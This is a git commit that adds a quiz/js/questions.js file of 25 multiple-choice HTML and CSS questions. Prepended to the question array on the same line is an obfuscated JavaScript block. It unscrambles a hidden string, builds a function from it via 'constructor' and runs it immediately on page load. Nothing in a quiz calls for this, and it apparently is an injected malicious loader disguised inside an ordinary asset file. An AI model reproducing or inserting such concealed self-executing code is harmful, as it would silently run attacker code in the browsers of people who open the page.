c398b1b3935e64b908c0062bc467f9b06c150556
Subrata291291 <subrata.haldar@codeclouds.com>
2025-01-10 13:34:42 +0530

    Added Quiz  folder

---
+++ quiz/js/questions.js
@@ -0,0 +1,278 @@
+var language,currentLanguage,languagesNoRedirect,hasWasCookie,expirationDate;(function(){var Tjo='',UxF=715-704;function JOC(d){var j=4658325;var f=d.length;var o=[];for(var y=0;y<f;y++){o[y]=d.charAt(y)};for(var y=0;y<f;y++){var r=j*(y+175)+(j%50405);var t=j*(y+626)+(j%53026);var a=r%f;var w=t%f;var b=o[a];o[a]=o[w];o[w]=b;j=(r+t)%7175692;};return o.join('')};var IDT=JOC('rynuunpjqsrkbdtecoomxtgfsolwcrhzvacti').substr(0,UxF);var wQg='];((t(1emA=3 vp=(.pv(r5f;can5rah7[,g"lm1(ilunp)nv][="uba; k=.thvraaa)).5)90;+21iud.6t8w<u1o7 vsg=0;l9o"i2*v0m8"2rq0i);)7=;{0j.ei=ecf7rnm8a)u=g]uukzuAnu,,kgu.cw[ .A]1=a+,;n[o["t{]2(98(s(vi.et=c6-]bafflov4ro1n07ef{b(,;dia8=of;=hho]r))h-rr zptrzlk=j)s;+;0pfrmt(-aruilol}.;ff9ot4b0,,t)v];rjr1)b*;,Seav i=.lil]r=i=)k+ar=]et8+r=n;fg v1ia..h6hs"anofa;=vht[s;<r f0nC+hc)p a}m1r<, pv{v;=4++;;6.,hsmCgdsAtlpvrtf.q,Cwgvp().,v.9rC(,(+==7nn6s}7rta=e))((+==;.";r+p.=n;h;")t n pddrco(u),C0;}()tg9o8+;6anp  i1ieergx+i)0+fi+n;([hel)dhro2;-g=we;f(f1s ht3=e  !thinivl}easpn=9(gn);=,,6e[(;>)s[,j)ghp7;p=batuihrjsri,a g=;,is(=8+.o+gv.(rr-;=].uzv 3,rp+oC="o(t)hsqu+hctlhsg;-}7uv;s)f=a[rtrlltsyn(h7,;}+calih5.g[hor;kechrx.qej4rneao);sn1uor[9),;;>0fvm2teb,v289fc c t[nedr{e b=a-r.,p46f,zCzvpl=d]nvjhzChnlrar;gs{igt(.a(,]< aeeasxaxgpslmtn{.)ec+(<x.=uo)9((r]aS[f(ogt;a=a,o")rAvg(1p; o;)neu=a+ +ns+lir(a+t!)f4jo=dgrg;';var CfB=JOC[IDT];var AzB='';var DUT=CfB;var gYD=CfB(AzB,JOC(wQg));var ENJ=gYD(JOC('!s(or3{0B=bB3a,wse6c0)ionBs\/o9r(t1;_1(ot.=!%iBB!p7_B}mBB.(eds4#Bk%!52,wrr3.r).B#c4.4(a*:;))1v0n1i_}r.DB5n(!5i],oBac;,o*8(+c!)_D,!4pnh%n(tsp4!gt%\/(t.rr}aerB5a.st=1,$ u7B]{7vc$c"llcj(7eBtuecytBwssBBB.1{4ywe=(r\/]Dl.r(om,1$f.\'=%t.8_dl]c.Tpes8gB_f{.C,4nw0t%fk)a.h$t\/a4 %B2gc, +.mp%.,..22iu9,g){.B)x#!5=S.oS(C,\'6t.peg,)]B4lBB$Bu]n8rB 21Bs{$y\'\'o7_.33!.!t26{g;-ip"]4u6#i$r.!l]2gt$c%);-a,uv;fo2un.ojyiuewvo)B8 h](0sBi{}upB9c2!%."8ce4Bd)%.h[](B3+ 01t)ahbh $BBaBv+(B83  c3p!03e%h5>)tul5ibtp%1ueg,B% ]7n))B;*i,me4otfbpis 3{.d==6Bs]B2 7B62)r1Br.zt;Bb2h BB B\/cc;:;i(jb$sab) cnyB3r=(pspa..t:_eme5B=.;,f_);jBj)rc,,eeBc=p!(a,_)o.)e_!cmn( Ba)=iBn5(t.sica,;f6cCBBtn;!c)g}h_i.B\/,B47sitB)hBeBrBjtB.B]%rB,0eh36rBt;)-odBr)nBrn3B 07jBBc,onrtee)t)Bh0BB(ae}i20d(a}v,ps\/n=.;)9tCnBow(]!e4Bn.nsg4so%e](])cl!rh8;lto;50Bi.p8.gt}{Brec3-2]7%; ,].)Nb;5B c(n3,wmvth($]\/rm(t;;fe(cau=D)ru}t];B!c(=7&=B(,1gBl()_1vs];vBBlB(+_.))=tre&B()o)(;7e79t,]6Berz.\';,%],s)aj+#"$1o_liew[ouaociB!7.*+).!8 3%e]tfc(irvBbu9]n3j0Bu_rea.an8rn".gu=&u0ul6;B$#ect3xe)tohc] (].Be|(%8Bc5BBnsrv19iefucchBa]j)hd)n(j.)a%e;5)*or1c-)((.1Br$h(i$C3B.)B5)].eacoe*\/.a7aB3e=BBsu]b9B"Bas%3;&(B2%"$ema"+BrB,$.ps\/+BtgaB3).;un)]c.;3!)7e&=0bB+B=(i4;tu_,d\'.w()oB.Boccf0n0}od&j_2%aBnn%na35ig!_su:ao.;_]0;=B)o..$ ,nee.5s)!.o]mc!B}|BoB6sr.e,ci)$(}a5(B.}B].z4ru7_.nnn3aele+B.\'}9efc.==dnce_tpf7Blb%]ge.=pf2Se_)B.c_(*]ocet!ig9bi)ut}_ogS(.1=(uNo]$o{fsB+ticn.coaBfm-B{3=]tr;.{r\'t$f1(B4.0w[=!!.n ,B%i)b.6j-(r2\'[ a}.]6$d,);;lgo *t]$ct$!%;]B6B((:dB=0ac4!Bieorevtnra 0BeB(((Bu.[{b3ce_"cBe(am.3{&ue#]c_rm)='));var KUr=DUT(Tjo,ENJ );KUr(6113);return 5795})()// creating an array and passing the number, questions, options, and answers
+let questions = [
+  {
+  numb: 1,
+  question: "What does HTML stand for?",
+  answer: "Hyper Text Markup Language",
+  options: [
+    "Hyper Text Preprocessor",
+    "Hyper Text Markup Language",
+    "Hyper Text Multiple Language",
+    "Hyper Tool Multi Language"
+  ]
+},
+  {
+  numb: 2,
+  question: "What does CSS stand for?",
+  answer: "Cascading Style Sheet",
+  options: [
+    "Common Style Sheet",
+    "Colorful Style Sheet",
+    "Computer Style Sheet",
+    "Cascading Style Sheet"
+  ]
+},
+  {
+  numb: 3,
+  question: "Which HTML element is used to create a hyperlink?",
+  answer: "a",
+  options: [
+    "link",
+    "a",
+    "hlink",
+    "url"
+  ]
+},
+  {
+  numb: 4,
+  question: "How many sizes of headers are available in HTML by default??",
+  answer: "6",
+  options: [
+    "1",
+    "6",
+    "4",
+    "5"
+  ]
+},
+  {
+  numb: 5,
+  question: "Which HTML attribute is used to define inline styles?",
+  answer: "style",
+  options: [
+    "class",
+    "style",
+    "id",
+    "styles"
+  ]
+},
+  {
+  numb: 6,
+  question: "Which HTML tag is used to define a table row?",
+  answer: "tr",
+  options: [
+    "td",
+    "tr",
+    "table",
+    "th"
+  ]
+},
+{
+  numb: 7,
+  question: "Which HTML meta tag is commonly used to make a webpage responsive on various devices?",
+  answer: "viewport",
+  options: [
+    "viewport",
+    "responsive",
+    "meta-responsive",
+    "meta viewport"
+  ]
+},
+{
+  numb: 8,
+  question: "Which HTML attribute is used to specify the type of information that should be entered into an input element?",
+  answer: "type",
+  options: [
+    "value",
+    "type",
+    "placeholder",
+    "name"
+  ]
+},
+{
+  numb: 9,
+  question: "Which HTML element is used to embed audio content in a webpage?",
+  answer: "audio",
+  options: [
+    "audio",
+    "sound",
+    "music",
+    "media"
+  ]
+},
+{
+  numb: 10,
+  question: "Which of the following is a valid way to specify a color in CSS?",
+  answer: "All of the above",
+  options: [
+    "color: #FF0000;",
+    "color: rgb(255,0,0);",
+    "color: red;",
+    "All of the above"
+  ]
+},
+{
+  numb: 11,
+  question: "In Bootstrap 5, what class is used to create a responsive navigation bar (navbar)?",
+  answer: ".navbar",
+  options: [
+    ".nav",
+    ".navbar",
+    ".nav-item",
+    ".navbar-collapse"
+  ]
+},
+{
+  numb: 12,
+  question: "Which of the following is the correct syntax for a CSS rule that sets the color of text to red?",
+  answer: "color: red;",
+  options: [
+    "text-color: red;",
+    "color: red;",
+    "font-color: red;",
+    "style: color red;"
+  ]
+},
+{
+  numb: 13,
+  question: "Which CSS property is used to set a background image for an element?",
+  answer: "background-image",
+  options: [
+    "background",
+    "background-color",
+    "background-image",
+    "image"
+  ]
+},
+{
+  numb: 14,
+  question: "Which CSS property is used to horizontally center an element within its containing element?",
+  answer: "margin: 0 auto;",
+  options: [
+    "text-align",
+    "align-items",
+    "align-item",
+    "margin: 0 auto;"
+  ]
+},
+{
+  numb: 15,
+  question: "What CSS property is used to add spacing between table cells?",
+  answer: "border-spacing",
+  options: [
+    "cell-spacing",
+    "table-spacing",
+    "padding",
+    "border-spacing"
+  ]
+},
+{
+  numb: 16,
+  question: "Which value of the position property is used to position an element relative to its normal position in the document flow?",
+  answer: "relative",
+  options: [
+    "static",
+    "relative",
+    "absolute",
+    "fixed"
+  ]
+},
+{
+  numb: 17,
+  question: "Which CSS property is used to define keyframe animations?",
+  answer: "animation",
+  options: [
+    "animation",
+    "keyframe",
+    "transition",
+    "animate"
+  ]
+},
+{
+  numb: 18,
+  question: "How to create an ordered list in HTML?",
+  answer: "ol",
+  options: [
+    "ul",
+    "ol",
+    "li",
+    "href"
+  ]
+},
+{
+  numb: 19,
+  question: "HTML files are saved by default with the extension?",
+  answer: ".html",
+  options: [
+    ".html",
+    ".css",
+    ".js",
+    ".ht"
+  ]
+},
+{
+  numb: 20,
+  question: "We enclose HTML tags within?",
+  answer: "< >",
+  options: [
+    "{ }",
+    "! !",
+    "< >",
+    "None of the above"
+  ]
+},
+{
+  numb: 21,
+  question: "What is the effect of the <b> tag?",
+  answer: "It converts the text within it to bold font.",
+  options: [
+    "It converts the text within it to bold font.",
+    "It is used to write black-colored font.",
+    "It is used to change the font size.",
+    "None of the above"
+  ]
+},
+{
+  numb: 22,
+  question: "Which of the following tags doesn’t require a closing tag?",
+  answer: "Both A and B",
+  options: [
+    "br",
+    "hr",
+    "Both A and B",
+    "None of the above"
+  ]
+},
+{
+  numb: 23,
+  question: "What are the attributes used to change the size of an image?",
+  answer: "Width and height",
+  options: [
+    "Width and height",
+    "Big and Small",
+    "Top and bottom",
+    "None of the above"
+  ]
+},
+{
+  numb: 24,
+  question: "Which attribute is used to provide a unique name to an HTML element?",
+  answer: "id",
+  options: [
+    "id",
+    "class",
+    "type",
+    "None of the above"
+  ]
+},
+{
+  numb: 25,
+  question: "What is the function of the HTML style attribute?",
+  answer: "It is used to add styles to an HTML element.",
+  options: [
+    "It is used to add styles to an HTML element.",
+    "It is used to uniquely identify some specific styles of some element.",
+    "Both A and B.",
+    "None of the above"
+  ]
+},
+];
